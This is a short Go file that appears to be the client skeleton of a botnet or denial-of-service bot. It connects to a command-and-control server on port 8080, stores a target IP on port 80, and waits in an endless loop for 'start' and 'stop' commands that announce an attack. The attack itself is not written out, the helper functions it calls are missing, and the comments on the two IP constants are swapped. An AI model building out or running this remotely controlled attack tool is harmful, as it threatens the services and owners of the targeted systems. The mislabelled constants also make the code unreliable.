package main

import (
	"bytes"
	"fmt"
)

var running int

const TARGET_IP = ""          // control server IP here
const SERVER_IP = "127.0.0.1" // target IP here

func main() {
	// var threads sync.WaitGroup

	// server socket details and setup
	server_addr := SERVER_IP + ":" + "8080"

	// target socket details and setup
	var target address
	target.ip = TARGET_IP
	target.port = "80"

	// connect server socket
	fmt.Println("Connecting to server...")
	server_socket := connectSocket(server_addr)

	// infinite loop
	for {
		cmd := make([]byte, 1024)
		receiveCommand(server_socket, &cmd)
		cmd = bytes.Trim(cmd, "\x00")
		if string(cmd) == "start" {
			fmt.Println("Executing attack...")
		} else if string(cmd) == "stop" {
			fmt.Println("Stopping attack...")
		}
	}
}
